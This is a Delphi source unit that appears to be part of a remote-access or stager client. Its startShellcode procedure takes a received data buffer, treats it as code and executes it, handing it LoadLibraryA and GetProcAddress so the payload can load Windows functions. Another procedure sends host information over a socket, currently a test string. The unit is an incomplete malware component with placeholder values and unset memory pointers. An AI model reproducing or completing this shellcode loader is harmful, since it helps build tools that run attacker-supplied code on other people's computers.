unit untUtils;
interface
uses
  Windows;
type
  xGetProcAddress = function(hModule: HMODULE; lpProcName: LPCSTR): FARPROC; stdcall;
  xLoadLibrary = function(strLib:PChar): HMODULE; stdcall;
  xGetMemory = function(dwLen:Integer):Pointer;
  xFreeMemory = procedure(ptrMemory:Pointer);
  xCopyMemory = procedure(pDestiny, pSource:Pointer; dwLen:Integer);

type
  TAPIBlock = record
    pGetProcAddress:    xGetProcAddress;
    pLoadLibraryA:      xLoadLibrary;
    pGetMemory:         xGetMemory;
    pFreeMemory:        xFreeMemory;
    pCopyMemory:        xCopyMemory;
  end;
  PAPIBlock = ^TAPIBlock;

type
  TShellCodeFunc = procedure (ptrData:Pointer; dwLen:Integer; ptrAPIBlock:PAPIBlock); stdcall;
  PShellCodeFunc = ^TShellCodeFunc;
  
procedure Log(strMessage:PChar);
procedure startShellcode(ptrData:Pointer; dwLen:Cardinal);
procedure SendInformation(hSocket:Integer);

implementation

uses
  untConnection;
  
procedure Log(strMessage:PChar);
begin
  {$IFDEF DEBUG}
    OutputDebugString(strMessage);
  {$ENDIF}
end;

procedure SendInformation(hSocket:Integer);
var
  compname:String;
begin
  compname := 'TEST NOW';
  SendBuffer(hSocket, 0, @compname[1], Length(compname) + 1);
end;

procedure startShellcode(ptrData:Pointer; dwLen:Cardinal);
var
  tlbAPIBlock:TAPIBlock;
  tlbShellCode:TShellCodeFunc;
  strMessage:String;
begin
  tlbShellCode := ptrData;
  strMessage := 'HELLO MAN';
  with tlbAPIBlock do
  begin
    pLoadLibraryA := @Windows.LoadLibraryA;
    pGetProcAddress := @Windows.GetProcAddress;
  end;
  tlbShellCode(@strMessage[1], Length(strMessage), @tlbAPIBlock);
end;
end.
